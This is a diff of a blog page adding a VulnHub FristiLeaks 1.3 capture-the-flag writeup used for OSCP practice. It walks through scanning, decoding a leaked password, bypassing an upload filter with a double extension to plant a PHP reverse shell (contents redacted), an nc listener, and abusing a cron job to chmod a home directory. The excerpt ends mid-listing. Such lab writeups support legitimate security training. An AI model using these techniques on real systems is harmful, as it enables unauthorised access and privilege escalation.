@@ -9,13 +9,13 @@
 
   
 
-  <title>Kioptrix Level 1 Writeup</title>
+  <title>FristiLeaks 1.3 Writeup</title>
 
   
   <meta name="author" content="Asher Andree">
   
 
-  <meta name="description" content="">
+  <meta name="description" content="FristiLeaks 1.3 is a VulnHub box that I used to prepare for the OSCP exam. It’s by far one of my favorite VulnHub boxes I’ve done, as it involves some fun and simple reversing/code analysis. It also involves practice hopping around and enumerating a Linux environment from the perspective of...">
 
   
 
@@ -72,8 +72,8 @@
 
   
   <meta property="og:site_name" content="0xAsh">
-  <meta property="og:title" content="Kioptrix Level 1 Writeup">
-  <meta property="og:description" content="">
+  <meta property="og:title" content="FristiLeaks 1.3 Writeup">
+  <meta property="og:description" content="FristiLeaks 1.3 is a VulnHub box that I used to prepare for the OSCP exam. It’s by far one of my favorite VulnHub boxes I’ve done, as it involves some fun and simple reversing/code analysis. It also involves practice hopping around and enumerating a Linux environment from the perspective of...">
 
   
   <meta property="og:image" content="http://localhost:4000/assets/img/logo_htb.png">
@@ -93,8 +93,8 @@
   <meta name="twitter:site" content="@0xashhh">
   <meta name="twitter:creator" content="@0xashhh">
 
-  <meta property="twitter:title" content="Kioptrix Level 1 Writeup">
-  <meta property="twitter:description" content="">
+  <meta property="twitter:title" content="FristiLeaks 1.3 Writeup">
+  <meta property="twitter:description" content="FristiLeaks 1.3 is a VulnHub box that I used to prepare for the OSCP exam. It’s by far one of my favorite VulnHub boxes I’ve done, as it involves some fun and simple reversing/code analysis. It also involves practice hopping around and enumerating a Linux environment from the perspective of...">
 
   
   <meta name="twitter:image" content="http://localhost:4000/assets/img/logo_htb.png">
@@ -156,7 +156,7 @@
     <div class="row">
       <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
         <div class="post-heading">
-          <h1>Kioptrix Level 1 Writeup</h1>
+          <h1>FristiLeaks 1.3 Writeup</h1>
           
 
           
@@ -184,7 +184,596 @@
       
 
       <article role="main" class="blog-post">
-        
+        <p>FristiLeaks 1.3 is a VulnHub box that I used to prepare for the OSCP exam. It’s by far one of my favorite VulnHub boxes I’ve done, as it involves some fun <em>and</em> simple reversing/code analysis.</p>
+
+<p>It also involves practice hopping around and enumerating a Linux environment from the perspective of multiple users, and requires some creative thinking.</p>
+
+<p>The challenge begins by using some simple guesswork to find a login portal. The source code of this login portal cotains an HTML comment that leaks a base64 encoded image.</p>
+
+<p>After decoding the image, we are able to gather the password used to login to web application. We exploit the web application’s upload functionality to upload a PHP reverse shell and get a reverse shell.</p>
+
+<p>Privilege escalation involves abusing a cronjob, reversing a simple python cryptography algorithm, reusing passwords, <em>and</em> a sudo misconfiguration to finally gather root.</p>
+
+<p class="box-note"><strong>Note About Setup:</strong> For the networking to properly work you’ll need to manually set the VMs MAC address to the following: <code class="language-plaintext highlighter-rouge">08:00:27:A5:A6:76</code> <br /><br />
+This can be done in Virtualbox via: Settings (ctrl +S) -&gt; Network -&gt; Advanced -&gt; Input <code class="language-plaintext highlighter-rouge">080027A5A676</code> into the <em>MAC Address</em> field.</p>
+
+<h1 id="enumeration">Enumeration</h1>
+
+<p>Let’s start as always with NMAP scans.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ein@~/VulnHub/FristiLeaks1.3:<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-Pn</span> <span class="nt">-p-</span> <span class="nt">-sSV</span> <span class="nt">-A</span> <span class="nt">-oN</span> fristiLeaks1.3_nmap 10.0.0.64
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-08-01 17:33 EDT
+Nmap scan report <span class="k">for </span>10.0.0.64
+Host is up <span class="o">(</span>0.00011s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65534 filtered ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.2.15 <span class="o">((</span>CentOS<span class="o">)</span> DAV/2 PHP/5.3.3<span class="o">)</span>
+| http-methods: 
+|_  Potentially risky methods: TRACE
+| http-robots.txt: 3 disallowed entries 
+|_/cola /sisi /beer
+|_http-server-header: Apache/2.2.15 <span class="o">(</span>CentOS<span class="o">)</span> DAV/2 PHP/5.3.3
+|_http-title: Site doesn<span class="s1">'t have a title (text/html; charset=UTF-8).
+MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 2.6.X|3.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
+OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
+</span></code></pre></div></div>
+
+<p>Interesting, looks like this will be heavily web-based. Let’s go ahead and get <code class="language-plaintext highlighter-rouge">Nikto</code> kicked off.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ein@~:<span class="nv">$ </span>nikto <span class="nt">-host</span> 10.0.0.64
+- Nikto v2.1.6
+<span class="nt">---------------------------------------------------------------------------</span>
++ Target IP:          10.0.0.64
++ Target Hostname:    10.0.0.64
++ Target Port:        80
++ Start Time:         2020-08-01 23:56:26 <span class="o">(</span>GMT-4<span class="o">)</span>
+<span class="nt">---------------------------------------------------------------------------</span>
++ Server: Apache/2.2.15 <span class="o">(</span>CentOS<span class="o">)</span> DAV/2 PHP/5.3.3
++ Server may leak inodes via ETags, header found with file /, inode: 12722, size: 703, mtime: Tue Nov 17 13:45:47 2015
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS                                                                                                             
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site <span class="k">in </span>a different fashion to the MIME <span class="nb">type</span>                                                                             
++ Entry <span class="s1">'/cola/'</span> <span class="k">in </span>robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>                                
++ Entry <span class="s1">'/sisi/'</span> <span class="k">in </span>robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>                                
++ Entry <span class="s1">'/beer/'</span> <span class="k">in </span>robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>                                
++ <span class="s2">"robots.txt"</span> contains 3 entries which should be manually viewed.                                                 
++ Apache/2.2.15 appears to be outdated <span class="o">(</span>current is at least Apache/2.4.37<span class="o">)</span><span class="nb">.</span> Apache 2.2.34 is the EOL <span class="k">for </span>the 2.x branch.                                                                                                              
++ PHP/5.3.3 appears to be outdated <span class="o">(</span>current is at least 7.2.12<span class="o">)</span><span class="nb">.</span> PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release <span class="k">for </span>each branch.                                                                                          
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE                                                            
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST                                 
++ OSVDB-3268: /icons/: Directory indexing found.                                                                   
++ OSVDB-3268: /images/: Directory indexing found.                                                                  
++ OSVDB-3233: /icons/README: Apache default file found.                                                            
++ 8701 requests: 0 error<span class="o">(</span>s<span class="o">)</span> and 15 item<span class="o">(</span>s<span class="o">)</span> reported on remote host                                                 
++ End Time:           2020-08-01 23:56:35 <span class="o">(</span>GMT-4<span class="o">)</span> <span class="o">(</span>9 seconds<span class="o">)</span>                                                      
+<span class="nt">---------------------------------------------------------------------------</span>                                        
++ 1 host<span class="o">(</span>s<span class="o">)</span> tested                                                                                                 
+</code></pre></div></div>
+
+<p>I’ll  enumerate a bit using a web browser. We’ll start as usual by just browsing to the default landing page.</p>
+
+<p><img src="/assets/img/VulnHub/Fristi_1.PNG" alt="Landing Page" /></p>
+
+<p>Nothing interesting here, let’s start looking at the sub-directories that nikto and NMAP picked up.</p>
+
+<p><code class="language-plaintext highlighter-rouge">/cola/</code>, <code class="language-plaintext highlighter-rouge">/sisi/</code>, and <code class="language-plaintext highlighter-rouge">/beer/</code> all result in the following page:</p>
+
+<p><img src="/assets/img/VulnHub/Fristi_2.PNG" alt="cola" /></p>
+
+<p>This part took me a while, but after thinking about it I simply tried <code class="language-plaintext highlighter-rouge">/fristi</code> and got the following result:</p>
+
+<p><img src="/assets/img/VulnHub/Fristi_3.PNG" alt="Frist admin page" /></p>
+
+<p>So kinda stupid. IDK, I banged my head against this trying to find some sweet bypass but whatever. Let’s keep moving on.</p>
+
+<p>We can start by taking a look at the source code of this login page:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+<span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"description"</span> <span class="na">content=</span><span class="s">"super leet password login-test page. We use base64 encoding for images so they are inline in the HTML. I read somewhere on the web, that thats a good way to do it."</span><span class="nt">&gt;</span>
+<span class="c">&lt;!-- 
+TODO:
+We need to clean this up for production. I left some junk in here to make testing easier.
+
+- by eezeepz
+--&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="nt">&lt;center&gt;&lt;h1&gt;</span> Welcome to #fristileaks admin portal<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
+
+~~~ REDACTED BASE64 ~~~
+
+<span class="c">&lt;!-- 
+iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx
+jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl
+S0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw
+B4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f
+m63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ
+Zv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb
+DpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd
+jJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU
+12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5
+uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1
+04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq
+i1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg
+tOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws
+30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl
+3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK
+ul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q
+mD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34
+rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe
+EPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH
+AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk
+CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR
+U5ErkJggg==
+--&gt;</span>
+</code></pre></div></div>
+
+<p>I got rid of the meaningless info, namely the image that we saw in the previous screenshot. This reveals a couple things:</p>
+<ul>
+  <li>A Base64 Id that is probably the key to our next step</li>
+  <li>A username of <code class="language-plaintext highlighter-rouge">eezepz</code></li>
+  <li>An HTML comment that is base64.</li>
+</ul>
+
+<p>Cool, let’s grab the base64 HTML comment and see what it contains:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>HTMLcomment | <span class="nb">base64</span> <span class="nt">-d</span>
+�PNG
+▒
+IHDRm4�A�sRGB���gAMA��
+                      �a        pHYs���o�dRIDATx^��Qv� �a��
+                                                           �z��l&amp;�I%KH�@f45�5��VI
+                                                                                 ���s��~���E��<span class="s2">"Gx�#��^/r�9���E��"</span>Gx�#��^/r�9���E��<span class="s2">"Gx�#��^/�����&amp;������T3h��#3՗j�
+                                                                                                                                                                 ��~�ݿ~��2�Z�e��L������ZZUW</span><span class="nv">$�</span><span class="s2">o��y���{K}�f�P����9{�6�X��KKL&gt;����a�%�ZD�
+                                                                                                                                                                                                                                      �Ś�B�'��*�%&amp;��Rxg�յ���V3]��#q�pz�R�</span><span class="se">\Z</span><span class="s2">b�n��   -]�յ���JH5�9r(����I5se��G�tXq"</span>k�6���j�                                  ���6��
+F��n�T3W��ג���ߞ���j�                                                          �g<span class="o">=</span>�Yx�i�bѢꍗj�ʒ�H-Y��ʯ��JH5Ӆx�D7<span class="o">(</span>
+                    ��ߠ�MI6�������D3�
+                                     ������M���JH5ӅZ�l3�GY�d��M▒o6��T�rR�
+                                                                         ��/�-��5ӅJ��I,�i9�l�Ѣ��Y��D���![
+
+�o����͹tWK<span class="o">}</span>�f�h�����<span class="o">}</span>d� <span class="o">[</span>��T5!Ռuɘ-��Ӈ������Ӌ,����C-GR��,����kj�<span class="se">\g</span><span class="o">}</span>&lt;���g.Ռuɘ-��V�_u��Z����#�|��_�A��Ӝ��<span class="s1">'c�jƸdЖJ{&lt;7
+����9C}�f�P�4��p�]��O���I5c\2hK�G����t��b����#�*�       ��:�����R��J��jƺ$����#+o`���L*9�I:�����,��&gt;��U騢"�3�jƼdȖ�ˆ#۞�����j��)'</span>�zUq��F&gt;L�Z���[Z4���LZ�R<span class="o">}</span>�f�ˑ����S<span class="p">;</span>���|�������f.-������h��FEZ�T_��&gt;�sd�a6�<span class="o">(</span>.�U^n|/�����ZZ��<span class="o">=</span>�#<span class="p">;</span>t����T_��&gt;Trd��+?���8�7�j-�<span class="o">}</span>d��R�t!�#�[/r�9���E��<span class="s2">"Gx�#��^/r�9���E��"</span>Gx�#��^/r�9���E��<span class="s2">"Gx�#��^/r�9���E�����Z�8�rqIEND�B</span><span class="sb">`</span>�ein@~/VulnHub/FristiLeaks1.3:<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p>We get a bunch of binary data, but we can clearly see some <code class="language-plaintext highlighter-rouge">PNG</code> magic bytes in the beginning there, let’s pipe the output to a file:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>HTMLcomment | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;&gt;</span> image.png
+</code></pre></div></div>
+
+<p>And viewing the image gives us:</p>
+
+<p><img src="/assets/img/VulnHub/Fristi_4.PNG" alt="Decoded image" /></p>
+
+<p>Nice, this is most likely a password.</p>
+
+<p>At first glance I thought it was maybe a cleartext password migrated to an esoteric language, like <a href="https://en.wikipedia.org/wiki/Brainfuck">brainfuck</a>.</p>
+
+<p>Looking back, I should have tried the lowest-hanging fruit first. If we go  back to the admin login page and try the following creds: <code class="language-plaintext highlighter-rouge">eezeepz:keKkeKKeKKeKkEkkEk</code>:</p>
+
+<p><img src="/assets/img/VulnHub/Fristi_5.PNG" alt="Successful login" /></p>
+
+<p>We have a successful login. Nice.</p>
+
+<h1 id="exploitation">Exploitation</h1>
+
+<p>Let’s begin to check out the file upload mechanism on the webpage:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Uploading, please <span class="nb">wait
+</span>The file has been uploaded to /uploads 
+</code></pre></div></div>
+
+<p>And trying to upload a random file type gives us this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sorry, is not a valid file. Only allowed are: png,jpg,gif
+Sorry, file not uploaded 
+</code></pre></div></div>
+
+<p>Cool, let’s try uploading a PHP reverse shell by simply changing the file name using Burp. For our purposes we’ll use the PHP web shell located on Kali in <code class="language-plaintext highlighter-rouge">/usr/share/webshells/php</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /fristi/do_upload.php HTTP/1.1
+Host: fristi
+User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Linux x86_64<span class="p">;</span> rv:68.0<span class="o">)</span> Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,<span class="k">*</span>/<span class="k">*</span><span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8
+Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
+Accept-Encoding: <span class="nb">gzip</span>, deflate
+Referer: http://fristi/fristi/upload.php
+Content-Type: multipart/form-data<span class="p">;</span> <span class="nv">boundary</span><span class="o">=</span><span class="nt">---------------------------1741988992628995641674019453</span>
+Content-Length: 5862
+Connection: close
+Cookie: <span class="nv">PHPSESSID</span><span class="o">=</span>ri1lakotitu9ijlqn0ua4gheh5
+Upgrade-Insecure-Requests: 1
+
+<span class="nt">-----------------------------1741988992628995641674019453</span>
+Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"fileToUpload"</span><span class="p">;</span> <span class="nv">filename</span><span class="o">=</span><span class="s2">"php-reverse-shell.php.gif"</span>
+Content-Type: application/x-php
+
+~~~ REDACTED ~~~
+
+</code></pre></div></div>
+
+<p>As you can see, we simply added <code class="language-plaintext highlighter-rouge">.gif</code> to the end of the <code class="language-plaintext highlighter-rouge">filename=</code> parameter. This successfully bypasses the control and uploads our file.</p>
+
+<p>I’ll go ahead and setup the listener I specified in the reverse shell (for me this was done via <code class="language-plaintext highlighter-rouge">rlwrap nc -nvlp 6969</code>) and browse to <code class="language-plaintext highlighter-rouge">/fristi/fristi/uploads/php-reverse-shell.php.gif</code>.</p>
+
+<p>And we get a shell:</p>
+
+<p><img src="/assets/img/VulnHub/Fristi_6.PNG" alt="Successful login" /></p>
+
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+
+<p>Moving on to privesc the first thing to note is that we are the <code class="language-plaintext highlighter-rouge">Apache</code> user.</p>
+
+<p>With this in mind let’s check out the webserver directory to see if there’s anything we can see on the backend:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-la</span> /var/www
+total 28
+drwxr-xr-x.  6 root root 4096 Nov 17  2015 <span class="nb">.</span>
+drwxr-xr-x. 19 root root 4096 Nov 19  2015 ..
+drwxr-xr-x.  2 root root 4096 Aug 24  2015 cgi-bin
+drwxr-xr-x.  3 root root 4096 Nov 17  2015 error
+drwxr-xr-x.  7 root root 4096 Nov 25  2015 html
+drwxr-xr-x.  3 root root 4096 Nov 17  2015 icons
+<span class="nt">-rw-r--r--</span>   1 root root   98 Nov 17  2015 notes.txt
+</code></pre></div></div>
+
+<p>Hmmm… let’s see what <code class="language-plaintext highlighter-rouge">notes.txt</code> says:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>notes.txt
+hey eezeepz your homedir is a mess, go clean it up, just dont delete
+the important stuff.
+
+<span class="nt">-jerry</span>
+</code></pre></div></div>
+
+<p>Okay, following the breadcrumbs:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-la</span> /home/eezeepz
+total 2608
+drwx---r-x. 5 eezeepz eezeepz  12288 Nov 18  2015 <span class="nb">.</span>
+drwxr-xr-x. 5 root    root      4096 Nov 19  2015 ..
+drwxrwxr-x. 2 eezeepz eezeepz   4096 Nov 17  2015 .Old
+<span class="nt">-rw-r--r--</span><span class="nb">.</span> 1 eezeepz eezeepz     18 Sep 22  2015 .bash_logout
+<span class="nt">-rw-r--r--</span><span class="nb">.</span> 1 eezeepz eezeepz    176 Sep 22  2015 .bash_profile
+<span class="nt">-rw-r--r--</span><span class="nb">.</span> 1 eezeepz eezeepz    124 Sep 22  2015 .bashrc
+drwxrwxr-x. 2 eezeepz eezeepz   4096 Nov 17  2015 .gnome
+drwxrwxr-x. 2 eezeepz eezeepz   4096 Nov 17  2015 .settings
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz  24376 Nov 17  2015 MAKEDEV
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz  33559 Nov 17  2015 cbq
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz   6976 Nov 17  2015 cciss_id
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz  56720 Nov 17  2015 cfdisk
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz  25072 Nov 17  2015 chcpu
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz  52936 Nov 17  2015 <span class="nb">chgrp</span>
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz  31800 Nov 17  2015 chkconfig
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz  48712 Nov 17  2015 <span class="nb">chmod</span>
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz  53640 Nov 17  2015 <span class="nb">chown</span>
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz  44528 Nov 17  2015 clock
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz   4808 Nov 17  2015 consoletype
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz 129992 Nov 17  2015 cpio
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz  38608 Nov 17  2015 cryptsetup
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz   5344 Nov 17  2015 ctrlaltdel
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz  41704 Nov 17  2015 <span class="nb">cut</span>
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz  14832 Nov 17  2015 halt
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz  13712 Nov 17  2015 <span class="nb">hostname</span>
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz  44528 Nov 17  2015 hwclock
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz   7920 Nov 17  2015 kbd_mode
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz  11576 Nov 17  2015 <span class="nb">kill</span>
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz  16472 Nov 17  2015 killall5
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz  32928 Nov 17  2015 kpartx
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz  11464 Nov 17  2015 nameif
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz 171784 Nov 17  2015 nano
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz   5512 Nov 17  2015 netreport
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz 123360 Nov 17  2015 netstat
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz  13892 Nov 17  2015 new-kernel-pkg
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz  25208 Nov 17  2015 <span class="nb">nice</span>
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz  13712 Nov 17  2015 nisdomainname
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz   4736 Nov 17  2015 nologin
+<span class="nt">-r--r--r--</span><span class="nb">.</span> 1 eezeepz eezeepz    514 Nov 18  2015 notes.txt
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz 390616 Nov 17  2015 <span class="nb">tar</span>
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz  11352 Nov 17  2015 taskset
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz 249000 Nov 17  2015 tc
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz  51536 Nov 17  2015 telinit
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz  47928 Nov 17  2015 <span class="nb">touch</span>
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz  11440 Nov 17  2015 tracepath
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz  12304 Nov 17  2015 tracepath6
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz  21112 Nov 17  2015 <span class="nb">true</span>
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz  35608 Nov 17  2015 tune2fs
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz  15410 Nov 17  2015 weak-modules
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz  12216 Nov 17  2015 wipefs
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz 504400 Nov 17  2015 xfs_repair
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz  13712 Nov 17  2015 ypdomainname
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz     62 Nov 17  2015 zcat
+<span class="nt">-rwxr-xr-x</span><span class="nb">.</span> 1 eezeepz eezeepz  47520 Nov 17  2015 zic
+</code></pre></div></div>
+
+<p>Dang, tons of crap in here. But hey, there’s another <code class="language-plaintext highlighter-rouge">notes.txt</code>, let’s see what this one says:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>notes.txt
+Yo EZ,
+
+I made it possible <span class="k">for </span>you to <span class="k">do </span>some automated checks, 
+but I did only allow you access to /usr/bin/<span class="k">*</span> system binaries. I did
+however copy a few extra often needed commands to my 
+homedir: <span class="nb">chmod</span>, <span class="nb">df</span>, <span class="nb">cat</span>, <span class="nb">echo</span>, ps, <span class="nb">grep</span>, egrep so you can use those
+from /home/admin/
+
+Don<span class="s1">'t forget to specify the full path for each binary!
+
+Just put a file called "runthis" in /tmp/, each line one command. The 
+output goes to the file "cronresult" in /tmp/. It should 
+run every minute with my account privileges.
+
+- Jerry
+</span></code></pre></div></div>
+
+<p>Okay cool! So basically we can run <code class="language-plaintext highlighter-rouge">chmod</code>, <code class="language-plaintext highlighter-rouge">df</code>, <code class="language-plaintext highlighter-rouge">cat</code>, <code class="language-plaintext highlighter-rouge">echo</code>, <code class="language-plaintext highlighter-rouge">ps</code>, <code class="language-plaintext highlighter-rouge">grep</code>, and <code class="language-plaintext highlighter-rouge">egrep</code> as Jerry.. whose username is <code class="language-plaintext highlighter-rouge">admin</code> on the box itself.</p>
+
+<p>Following his directions, we’ll create a file called <code class="language-plaintext highlighter-rouge">runthis</code> in <code class="language-plaintext highlighter-rouge">/tmp</code>… Inside of it we can put one of those binary commands.</p>
+
+<p>Looking at our options, I think our best bet would be to use <code class="language-plaintext highlighter-rouge">chmod</code> to allow us access to Jerry’s home directory. We can do this via:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"/home/admin/chmod 777 /home/admin"</span> <span class="o">&gt;&gt;</span> /tmp/runthis
+</code></pre></div></div>
+
+<p>And after waiting a minute or so, we can see the following inside of cronresult:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>executing: /home/admin/chmod 777 /home/admin
+</code></pre></div></div>
+
+<p>Cool! Let’s go take a look:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-la</span> /home/admin
+total 652
+drwxrwxrwx. 2 admin     admin       4096 Nov 19  2015 <span class="nb">.</span>
+drwxr-xr-x. 5 root      root        4096 Nov 19  2015 ..
+<span class="nt">-rw-r--r--</span><span class="nb">.</span> 1 admin     admin         18 Sep 22  2015 .bash_logout
